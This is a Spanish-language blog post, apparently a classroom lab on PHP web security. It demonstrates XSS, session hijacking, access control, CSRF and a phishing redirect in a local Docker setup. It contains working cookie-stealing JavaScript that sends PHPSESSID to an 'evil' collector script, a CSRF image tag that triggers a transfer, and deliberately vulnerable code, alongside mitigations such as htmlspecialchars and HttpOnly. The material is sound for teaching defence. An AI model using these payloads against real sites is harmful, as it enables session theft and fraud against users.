---
title: Validación de entradas
layout: post
author: Patrick Campillo
excerpt_separator: <!--more-->
typora-copy-images-to: ../images/
typora-root-url: ../
---

## XSS (Cross-site-scripting)

Comenzando con esta práctica, vamos a conocer uno de los ataques más utilizados contra servidores web, el **XSS**. Para esto comenzaremos utilizando una página básica con el nombre `post.php` que contendrá lo siguiente:

```php
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
</head>
<body>

<?php
if ($_SERVER['REQUEST_METHOD'] == "GET") {
?>
<p>Nuevo Post</p>
<form action='post.php' method='post'>
	<textarea name="textarea" rows="10" cols="50">Escribe algo aquí</textarea>
	<input type = 'submit' value='enviar'>
</form>
<?php
}else
	echo $_POST["textarea"] ?? "";
?>
</body>
</html>
```



Su propósito es bastante simple, mostrar una página con los datos introducidos. Pero si en el cuadro de introducir insertamos el texto `<script>alert('hackeado')</script>` y enviamos. 

![](/images/valentradas/1.png)



Habremos realizado un ataque XSS simple, pero efectivo.

![](/images/valentradas/2.png)







## Mitigar XSS

Para poder parar estos ataques en el servidor podemos hacer uso de las funciones `htmlspecialchars` o `htmlentities`, o utilizar algún purificador que detecte estos caracteres o textos peligrosos. Por lo que, ahora, vamos a crear otro archivo, llamado `post_mejorado.php`, que mediante una de las funciones mencionadas antes, mostrará el texto incluya el carácter que incluya.

```php
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
</head>
<body>

<?php
if ($_SERVER['REQUEST_METHOD'] == "GET") {
?>
<p>Nuevo Post</p>
<form action='post.php' method='post'>
	<textarea name="textarea" rows="10" cols="50">Escribe algo aquí</textarea>
	<input type = 'submit' value='enviar'>
</form>
<?php
}else
	echo htmlspecialchars($_POST["textarea"]) ?? "";
?>
</html>
```



Por lo que si volvemos a introducir `<script>alert('hackeado')</script>`

![](/images/valentradas/3.png)

Se mostrará tal cual.

![](/images/valentradas/4.png)







## Autenticación con Sesiones

Manejar la sesión de cada usuario, es un componente fundamental de la seguridad en la gran mayoría de aplicaciones web. Ya que permite identificar de forma única a cada usuario, manejando sus solicitudes y agilizando los procesos con el servidor. Actualmente, se utilizan las conocidas **cookies**, para almacenar el ID de sesión de cada usuario. Pudiendo así, recordar la sesión durante un largo periodo de tiempo, y personalizando las preferencias de cada usuario.



A continuación crearemos una nueva página, llamada `login.php`, en la cual encontraremos un formulario de inicio de sesión mediante **PHP**.

```php
<?php
session_start();

//En una aplicación real, los usuarios estarían almaenados en la base de datos
$all_users = array ("mario" => "qwerty", "juan" => "123456");
$valid_users = array_keys($all_users);

$ya_registrado = $_SESSION['ya_registrado'] ?? false;


if ($_SERVER['REQUEST_METHOD'] == "POST" && !$ya_registrado){
	$usuario = $_POST['usuario'] ?? "";
	$password = $_POST['password'] ?? "";
    
	$ya_registrado = (in_array($usuario, $valid_users)) && ($password == $all_users[$usuario]);
	if ($ya_registrado){
		$_SESSION['ya_registrado'] = true;
		$_SESSION['usuario'] = $usuario;
	}
}

if ($ya_registrado){
	// Si llega aqui es porque es un usuario válido.
	echo "<p>Welcome " . $_SESSION['usuario'] . "</p>";
	echo "<p>Congratulations, you are into the system.</p>";
}else{
?>
	
	<form action='login.php' method='post'>
		Usuario: <input type='text' name = "usuario" id="usuario" value=""><br>
		Contraseña: <input type='password' name = "password" id = "password" value=""><br>
		<input type='submit' value='Enviar'>
	</form>
<?php
}
?>
```



Por lo que una vez iniciado sesión con un usuario, por ejemplo Mario:

![](/images/valentradas/5.png)

Encontraríamos la ID de la Sesión en una **cookie** de la cabecera de la petición.

![](/images/valentradas/6.png)



Para poder desconectar a un usuario, y así desasociarlo de su ID de Sesión, se utiliza el método `session_destroy()`. Y lo podemos realizar creando un nuevo archivo llamado `logout.php`.

```php
<?php
session_start();
session_unset();
session_destroy();
//redirigimos a login.php
header('Location: login.php');
```







## Robo de sesión

Como ya sabemos, el ID de sesión es único. Por lo cual, si alguien consigue robártelo, puede suplantar tu identidad y realizar acciones con tu cuenta como si las realizases tú. Esto lo veremos ahora con un caso práctico de robo de sesión.



Por un lado, comenzaremos creando una página llamada `robo-de-sesion.php`, que almacenaremos en un contenedor **Docker**, que hará la función de servidor web "**evil**" y escuchará en el puerto **8080**, por así decirlo. Esta página contendrá lo siguiente:

```php
<?php
$session_robada = $_GET['session_robada'] ?? "";
$session_robada .= "\n";
$fichero = 'sessions.txt';
// Abre el fichero para obtener el contenido existente
$actual = file_get_contents($fichero);
// Escribe el contenido al fichero
file_put_contents($fichero, $session_robada, FILE_APPEND);
```



Y por otro lado, crearemos una segunda página llamada `hackeada.php`, en otro contenedor **Docker**,  que realizará la función de servidor web "**seguro**" y escuchará en el puerto **8086**. Esta página contendrá lo siguiente:

```php
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
</head>
<body>
    Esta es una página que ha sido hackeada mediante XSS.
Al acceder, envía la cookie de sesión al sitio http://evil.local
<script>
var c = document.cookie.replace(/(?:(?:^|.*;\s*)PHPSESSID\s*\=\s*([^;]*).*$)|^.*$/, "$1")
var myImage = new Image(1,1);
myImage.src = "http://127.0.0.1:8080/robo-de-sesion.php?session_robada=" + c;
</script>

</body>
</html>
```



Para poner en funcionamiento el ataque, primero deberemos iniciar sesión con un usuario, y seguidamente visitar la página `hackeada.php `. 

![](/images/valentradas/7.png)



Como podemos observar, nos indica que nos ha robado la sesión y la ha enviado al servidor web **evil**. Y lo podemos comprobar, accediendo al contenedor **Docker** del servidor web **evil**, y mostrando el fichero `sessions.txt`.

![](/images/valentradas/8.png)



Una vez conocemos la ID de Sesión, accedemos a la página `login.php` mediante una pestaña de incógnito,  y comprobamos la nueva ID de Sesión que tenemos.

![](/images/valentradas/9.png)



Ahora, la editamos e introducimos la que hemos robado mediante **XSS**.

![](/images/valentradas/9-1.png)



Y enviando la nueva petición, obtendremos la siguiente vista preliminar.

![](/images/valentradas/9-2.png)



Otra forma de realizar este proceso es utilizando alguna extensión de administración de **cookies**, en la cual, buscaremos la **cookie** que indica el ID de sesión.

![](/images/valentradas/10.png)

 Y una vez encontrado, lo modificaremos por el valor de la ID robada. Lo guardaremos, verificaremos que está establecida, y al recargar la página obtendremos el mismo resultado de antes con la vista preliminar. Pero esta vez en la propia página.

![](/images/valentradas/10-1.png)



![](/images/valentradas/10-2.png)



![](/images/valentradas/10-3.png)







## Evitar el robo de sesión

Para evitar estas situaciones, existe una cabecera que impide que las **cookies** se puedan leer por **JavaScript**. Esta cabecera se llama `HttpOnly` y se puede añadir de la siguiente manera en la parte superior de nuestra página `login.php`:

![](/images/valentradas/11.png)



De esta forma, al intentar realizar el ataque anterior, el servidor **evil**, no recibiría la ID de la Sesión.







## Control de acceso (Autorización)

La mayoría de organizaciones, utilizan el principio de mínimo privilegio. El cual, indica que cada usuario solo debe ser capaz de acceder a la información y recursos necesarios para su desempeño legítimo. Por lo que, a continuación, realizaremos algunas modificaciones a nuestra página `login.php`, y crearemos una nueva página llamada `autenticacion.php`. Esta, además de permitir inicializar la sesión a los usuarios, les asignará un rol dependiendo del usuario que sea.

```php
  
<?php
session_start();

//En una aplicación real, los usuarios estarían almacenados en la base de datos y la contraseña estaría encriptada, como veremos más adelante
$all_users = array ("mario" => ["qwerty", "ADMIN"], "juan" => ["123456", "USER"]);
$valid_users = array_keys($all_users);

$ya_registrado = $_SESSION['ya_registrado'] ?? false;

if ($_SERVER['REQUEST_METHOD'] == "POST" && !$ya_registrado){
	$usuario = $_POST['usuario'] ?? "";
	$password = $_POST['password'] ?? "";

	$passwordUsuario = $all_users[$usuario][0];
	$rolUsuario = $all_users[$usuario][1];
	
	$ya_registrado = (in_array($usuario, $valid_users)) && ($password == $passwordUsuario);
	if ($ya_registrado){
		$_SESSION['ya_registrado'] = true;
		$_SESSION['usuario'] = $usuario;
		$_SESSION['ROL'] = $rolUsuario;
	}else{
        echo "Usuario no encontrado";
    }	
}

if ($ya_registrado){
	// Si llega aqui es porque es un usuario válido.
	echo "<p>Welcome " . $_SESSION['usuario'] . "</p>";
	echo "<p>Congratulations, you are into the system.</p>";
}else{
?>
	
	<form action='autenticacion.php' method='post'>
		Usuario: <input type='text' name = "usuario" id="usuario" value=""><br>
		Contraseña: <input type='password' name = "password" id = "password" value=""><br>
		<input type='submit' value='Enviar'>
	</form>
<?php
}
?>
```



Además, crearemos una página diferente dependiendo de que usuario acceda a la aplicación web. Si eres un usuario normal accederás a `perfil.php`.

```php
<?php
session_start();
if (!$_SESSION['ya_registrado']){
	header('Location: autenticacion.php');
}
if ($_SESSION['ROL'] != "USER"){
	header('Location: no-autorizado.php');
}
?>
<h1>Página de perfil del usuario.</h1>
```



Si eres el administrador accederás a `admin.php`.

```php
<?php
session_start();
if (!$_SESSION['ya_registrado']){
	header('Location: autenticacion.php');
}
if ($_SESSION['ROL'] != "ADMIN"){
	header('Location: no-autorizado.php');
}
?>
<h1>Página de administración del sitio</h1>
```



 Y si  en algún momento, algún usuario intentara acceder a alguna parte a la que no tiene acceso, se le reenviaría a `no-autorizado.php`.

```php
<?php
session_start();
?>
<h1>Acceso no autorizado</h1>
```







## CSRF (Cross Site Request Forgery)

El **CSRF**, es un tipo de ataque **XSS**, que intenta conseguir que la víctima envíe, sin saberlo, una solicitud web malintencionada a un sitio web al que la víctima tiene acceso privilegiado. Por ejemplo, por un lado, tenemos al usuario **Mario** que está logeado en el sistema. En este sistema, existe una página que permite realizar transferencias de dinero, llamada `127.0.0.1:8086/transfer.php`. Por otro lado, tenemos a un atacante llamado **Juan** que ha conseguido, mediante **XSS**, introducir código en una de las páginas que visita **Mario**.

```html
<img src='http://localhost:8000/transfer.php?quantity=1000&user=juan'>
```

Por lo que ahora, cada vez que **Mario**, acceda a esa página enviará 1000€ a **Juan**. 

La página `transfer.php` contiene el siguiente código:

```php
<?php
session_start();
if (!$_SESSION['ya_registrado']){
	header('Location: login.php');
}
$from = $_SESSION['usuario'];
$to = $_GET['to'];
$quantity = $_GET['quantity'];
//Este código es una simplificación 
$BD = "Transferencia realizada de $from a $to; cantidad: $quantity";
$fichero = 'transfers.txt';
// Abre el fichero para obtener el contenido existente
$actual = file_get_contents($fichero);
// Escribe el contenido al fichero
file_put_contents($fichero, $BD, FILE_APPEND);
```

 

Y este código, es el que representa la página `hackeada-csrf.html`:

```html
Esta es una página que ha sido hackeada mediante XSS.
Al acceder, realiza una transferencia de 1000 € al atacante.
<img src='http://localhost/transfer.php?quantity=1000&to=juan'>
```



La cual se muestra a **Mario** de la siguiente forma cuando accede a su página atacada.

![](/images/valentradas/12-1.png)







## Redirigir a otra web

Por último, veremos otro tipo de ataque **XSS**, el cual realiza una redirección a una web controlada por el atacante, pero que visualmente, esta representada igual que la real. Por ejemplo si creamos la siguiente página, llamada `hackeada-redirect.html`:

```php
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
</head>
<body>
    Esta es una página que ha sido hackeada mediante XSS.
Al acceder, reenvía al visitante a una página controlada por un hacker
<script>document.location = 'http://localhost:8080/clon-de-mi-banco.html'</script>
</body>  
```



Cuando el usuario acceda a ella, se le redirigirá a la página `clon-de-mi-banco.html`, controlada por el servidor web **evil**.

```php
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
</head>
<body>
<p>Esta página es un clon de la página de login de mi banco. Cuando el usuario realiza un login, los datos de conexíón son capturados por el atacante.</p>
<p>Otra posibilidad es que desde esta página se instale un malware en el ordenador</p>
<p>Las posibilidades son infinitas...</p>
</body>
</html>
```



Y si realizará el inicio de sesión, como si se tratará de la página real, estos datos se enviarán al atacante.